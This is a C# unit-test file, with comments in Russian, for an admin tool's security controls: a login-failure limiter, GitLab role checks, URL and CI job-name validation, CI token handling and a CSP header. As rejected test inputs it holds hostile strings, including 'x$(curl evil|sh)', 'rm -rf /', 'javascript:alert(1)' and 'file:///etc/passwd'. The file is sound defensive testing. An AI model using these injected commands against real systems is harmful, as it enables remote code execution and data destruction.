using ProAdmin.GitLab;
using ProAdmin.Infrastructure;
using ProAdmin.Modules;
using ProAdmin.Sessions;
using ProAdmin.Settings;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Options;

namespace ProAdmin.Tests;

/// <summary>Права, ограничение перебора, безопасные ссылки и значения, которые попадают в CI-конфигурацию.</summary>
public class AccessTests
{
    // ---------------------------------------------------------------- ограничение перебора

    [Fact]
    public void Limiter_blocks_after_the_limit_and_releases_after_the_block()
    {
        var now = DateTimeOffset.UtcNow;
        var limiter = new AuthFailureLimiter(10, TimeSpan.FromMinutes(5), TimeSpan.FromMinutes(5), () => now);

        for (var i = 0; i < 9; i++)
            Assert.False(limiter.Fail("login", "1.1.1.1"));
        Assert.False(limiter.IsBlocked("login", "1.1.1.1"));
        Assert.True(limiter.Fail("login", "1.1.1.1"));
        Assert.True(limiter.IsBlocked("login", "1.1.1.1"));

        // Другой адрес и другая область не затронуты.
        Assert.False(limiter.IsBlocked("login", "2.2.2.2"));
        Assert.False(limiter.IsBlocked("ci", "1.1.1.1"));

        now += TimeSpan.FromMinutes(4);
        Assert.True(limiter.IsBlocked("login", "1.1.1.1"));
        now += TimeSpan.FromMinutes(2);
        Assert.False(limiter.IsBlocked("login", "1.1.1.1"));
    }

    [Fact]
    public void Limiter_forgets_failures_older_than_the_window()
    {
        var now = DateTimeOffset.UtcNow;
        var limiter = new AuthFailureLimiter(10, TimeSpan.FromMinutes(5), TimeSpan.FromMinutes(5), () => now);

        for (var i = 0; i < 9; i++)
            limiter.Fail("login", "1.1.1.1");
        now += TimeSpan.FromMinutes(6);
        Assert.False(limiter.Fail("login", "1.1.1.1")); // десятая, но первые девять уже вне окна
        Assert.False(limiter.IsBlocked("login", "1.1.1.1"));
    }

    [Fact]
    public void Limiter_caps_tracked_addresses_and_prunes_by_time()
    {
        var now = DateTimeOffset.UtcNow;
        var limiter = new AuthFailureLimiter(2, TimeSpan.FromMinutes(5), TimeSpan.FromMinutes(5), () => now);
        for (var i = 0; i < AuthFailureLimiter.MaxEntries; i++)
            limiter.Fail("login", $"10.{i / 65536}.{i / 256 % 256}.{i % 256}");
        Assert.Equal(AuthFailureLimiter.MaxEntries, limiter.Tracked);

        // таблица заполнена: новый адрес не записывается и не блокируется
        Assert.False(limiter.Fail("login", "192.0.2.1"));
        Assert.False(limiter.Fail("login", "192.0.2.1"));
        Assert.Equal(AuthFailureLimiter.MaxEntries, limiter.Tracked);
        Assert.False(limiter.IsBlocked("login", "192.0.2.1"));

        // уже известный адрес считается и блокируется
        Assert.True(limiter.Fail("login", "10.0.0.0"));
        Assert.True(limiter.IsBlocked("login", "10.0.0.0"));

        // по истечении окна очистка освобождает таблицу, и новый адрес снова считается
        now += TimeSpan.FromMinutes(6);
        Assert.False(limiter.Fail("login", "192.0.2.1"));
        Assert.Equal(1, limiter.Tracked);
        Assert.True(limiter.Fail("login", "192.0.2.1"));
    }

    // ---------------------------------------------------------------- роли

    [Fact]
    public void Group_access_fails_closed()
    {
        Assert.True(GitLabGroupAccess.CannotChange(null));
        Assert.True(GitLabGroupAccess.CannotChange(new GitLabGroupAccess("g", 20, false, true, null)));
        Assert.True(GitLabGroupAccess.CannotChange(new GitLabGroupAccess("g", 0, false, false, "GitLab недоступен")));
        Assert.True(new GitLabGroupAccess("g", 0, true, true, "ошибка").ReadOnly); // ошибка запрещает даже администратору
        Assert.False(GitLabGroupAccess.CannotChange(new GitLabGroupAccess("g", 30, false, true, null)));
        Assert.False(GitLabGroupAccess.CannotChange(new GitLabGroupAccess("g", 0, true, true, null)));
    }

    [Fact]
    public void Prod_admin_is_the_session_that_logged_in_on_the_prod_server()
    {
        var settings = new AdminSettings();
        settings.Normalize();
        settings.Find(AdminSettings.Test)!.PilotUrl = "http://test/db";
        settings.Find(AdminSettings.Prod)!.PilotUrl = "http://prod/db";

        Assert.True(Session(new EnvironmentAccess("test", "Тест", "http://test/db", null), new EnvironmentAccess("prod", "Прод", "http://prod/db", null)).IsProdAdmin(settings));
        Assert.False(Session(new EnvironmentAccess("test", "Тест", "http://test/db", null)).IsProdAdmin(settings));
        Assert.False(Session(new EnvironmentAccess("test", "Тест", "http://test/db", null), new EnvironmentAccess("prod", "Прод", "http://prod/db", "отказ")).IsProdAdmin(settings));
        Assert.False(Session().IsProdAdmin(settings)); // вход по адресу вручную при настроенных серверах
    }

    [Fact]
    public void Without_a_prod_server_any_configured_login_is_enough_and_first_run_is_open()
    {
        var noProd = new AdminSettings();
        noProd.Normalize();
        noProd.Find(AdminSettings.Test)!.PilotUrl = "http://test/db";
        Assert.True(Session(new EnvironmentAccess("test", "Тест", "http://test/db", null)).IsProdAdmin(noProd));
        Assert.False(Session().IsProdAdmin(noProd));

        var firstRun = new AdminSettings();
        firstRun.Normalize();
        Assert.True(Session().IsProdAdmin(firstRun)); // серверов нет вовсе: настроить их иначе нельзя
    }

    private static UserSession Session(params EnvironmentAccess[] access) =>
        new("sid", "http://localhost", new StoredCredential("admin", "x")) { LoginAccess = access };

    // ---------------------------------------------------------------- ссылки и регулярные выражения

    [Theory]
    [InlineData("http://kaiten.example/card/1", true)]
    [InlineData("https://kaiten.example/card/1", true)]
    [InlineData("javascript:alert(1)", false)]
    [InlineData("JaVaScRiPt:alert(1)", false)]
    [InlineData("data:text/html,<script>", false)]
    [InlineData("file:///etc/passwd", false)]
    [InlineData("/relative", false)]
    [InlineData("", false)]
    [InlineData(null, false)]
    public void Only_http_and_https_links_are_safe(string? url, bool safe) =>
        Assert.Equal(safe ? url : null, SafeUrl.Http(url));

    [Fact]
    public void Task_url_template_with_other_scheme_gives_no_link()
    {
        Assert.Equal("https://kaiten.example/card/1234", ModuleBranches.TaskUrl("KTN-1234", "https://kaiten.example/card/{number}"));
        Assert.Null(ModuleBranches.TaskUrl("KTN-1234", "javascript:alert('{task}')"));
        Assert.Null(ModuleBranches.TaskUrl("KTN-1234", ""));
    }

    [Fact]
    public void Task_pattern_that_times_out_is_not_a_server_error()
    {
        // Катастрофический возврат: проверка прерывается по тайм-ауту (1 с) и даёт «номера нет», а не исключение.
        Assert.Null(ModuleBranches.Task(new string('a', 40) + "!", "^(a+)+$"));
        Assert.Equal("KTN-12", ModuleBranches.Task("feature/ktn-12-x", @"KTN-\d+"));
    }

    // ---------------------------------------------------------------- значения, попадающие в CI-конфигурацию

    [Theory]
    [InlineData("build_module", true)]
    [InlineData("build-module2", true)]
    [InlineData("_b", true)]
    [InlineData("build module", false)]
    [InlineData("x$(id)", false)]
    [InlineData("x\"; rm -rf /; \"", false)]
    [InlineData("1build", false)]
    [InlineData("build\ndeploy_prod:", false)]
    [InlineData("", false)]
    public void Build_job_name_is_a_plain_identifier(string name, bool valid) =>
        Assert.Equal(valid, AdminSettings.IsValidJobName(name));

    [Theory]
    [InlineData("", true)]
    [InlineData("automation.yml@pilot-ci/checks", true)]
    [InlineData(".gitlab-ci.yml", true)]
    [InlineData("ci/report.yml@group/sub/project", true)]
    [InlineData("a.yml@x y", false)]
    [InlineData("a.yml;rm", false)]
    [InlineData("http://evil/a.yml", false)]
    public void Ci_config_path_has_a_known_shape(string path, bool valid) =>
        Assert.Equal(valid, AdminSettings.IsValidCiConfigPath(path));

    [Fact]
    public void Template_never_takes_a_dangerous_job_name_from_settings()
    {
        var settings = new AdminSettings { ModulesBuildJob = "x$(curl evil|sh)" };
        var yml = ModuleCiTemplate.Content(settings).Replace("\r\n", "\n");
        Assert.DoesNotContain("curl evil", yml);
        Assert.Contains("\nbuild_module:\n", yml);
    }

    // ---------------------------------------------------------------- шаблон CI выкладки

    [Fact]
    public void Template_gives_job_token_only_to_nuget_sources_on_the_gitlab_host()
    {
        var yml = ModuleCiTemplate.Content(new AdminSettings()).Replace("\r\n", "\n");
        Assert.Contains("HOST_RE=$(printf '%s' \"$CI_SERVER_HOST\"", yml);
        Assert.Contains("value=\"https?://'\"$HOST_RE\"'(:[0-9]+)?(/[^\"]*)?/api/v4/", yml);
        Assert.DoesNotContain("value=\"[^\"]*/api/v4/", yml); // прежний шаблон брал источник с любым хостом
    }

    [Fact]
    public void Template_sends_job_token_and_contour_keys()
    {
        var yml = ModuleCiTemplate.Content(new AdminSettings()).Replace("\r\n", "\n");
        var deploy = yml[yml.IndexOf(".deploy:", StringComparison.Ordinal)..];

        Assert.Contains("X-Job-Token: $CI_JOB_TOKEN", deploy);
        Assert.Contains("X-Deploy-Key: $DEPLOY_KEY", deploy);
        foreach (var contour in new[] { "TEST", "STAGE", "PROD" })
            Assert.Contains($"DEPLOY_KEY_{contour}", deploy); // ключ контура, общего ключа нет
        // Локальная DEPLOY_KEY получает значение только из ключа своего контура: общей переменной группы нет.
        var assigned = System.Text.RegularExpressions.Regex.Matches(yml, "\\bDEPLOY_KEY=\"\\$\\{(\\w+):-\\}\"")
            .Select(m => m.Groups[1].Value).ToArray();
        Assert.Equal(new[] { "DEPLOY_KEY_TEST", "DEPLOY_KEY_STAGE", "DEPLOY_KEY_PROD" }, assigned);
        Assert.DoesNotContain("${DEPLOY_KEY:-}", yml);
        Assert.Contains("Masked и Protected", yml);
        // Текстовые поля - через --form-string: тема коммита с «<» или «@» не читается как файл.
        Assert.Contains("--form-string \"notes=$NOTES\"", deploy);
        Assert.DoesNotContain("-F \"notes=", yml);
    }

    [Fact]
    public void Library_check_needs_only_the_job_token()
    {
        var yml = ModuleCiTemplate.Content(new AdminSettings()).Replace("\r\n", "\n");
        var start = yml.IndexOf("\ncheck_libraries:", StringComparison.Ordinal);
        var section = yml[start..yml.IndexOf(".deploy:", start, StringComparison.Ordinal)];

        Assert.Contains("X-Job-Token: $CI_JOB_TOKEN", section);
        Assert.DoesNotContain("X-Deploy-Key", section);
        Assert.DoesNotContain("DEPLOY_KEY", section);
    }

    // ---------------------------------------------------------------- OAuth и заголовки

    [Theory]
    [InlineData(null, null, "http://request-host:5300/GitLab/Callback")]
    [InlineData("http://admin.example.local:5300/", null, "http://admin.example.local:5300/GitLab/Callback")]
    [InlineData("https://admin.example.local", null, "https://admin.example.local/GitLab/Callback")]
    [InlineData("http://admin.example.local:5300", "http://explicit/cb", "http://explicit/cb")]
    public void Oauth_redirect_uri_comes_from_the_public_url(string? publicUrl, string? explicitUri, string expected)
    {
        var options = new AppOptions { PublicUrl = publicUrl, GitLab = { RedirectUri = explicitUri } };
        var auth = new GitLabAuthService(new NoHttp(), new NetworkAddressMapper(null), Options.Create(options));
        var request = new DefaultHttpContext().Request;
        request.Scheme = "http";
        request.Host = new HostString("request-host", 5300);

        Assert.Equal(expected, auth.ResolveRedirectUri(request));
    }

    [Fact]
    public void Csp_allows_only_own_scripts_with_nonce_and_no_external_hosts()
    {
        var csp = SecurityHeaders.ContentSecurityPolicy("abc");
        var script = csp.Split(';').Select(p => p.Trim()).Single(p => p.StartsWith("script-src", StringComparison.Ordinal));

        Assert.Equal("script-src 'self' 'nonce-abc'", script);
        Assert.DoesNotContain("unsafe-inline", script);
        // CodeMirror лежит в wwwroot/vendor: внешних адресов для скриптов и стилей нет
        Assert.DoesNotContain("cdnjs", csp);
        var style = csp.Split(';').Select(x => x.Trim()).Single(x => x.StartsWith("style-src", StringComparison.Ordinal));
        Assert.Equal("style-src 'self' 'unsafe-inline'", style);
        Assert.DoesNotContain("unsafe-eval", csp);
        Assert.Contains("frame-ancestors 'none'", csp);
        Assert.Contains("object-src 'none'", csp);
    }

    private sealed class NoHttp : IHttpClientFactory
    {
        public HttpClient CreateClient(string name) => throw new NotSupportedException();
    }
}
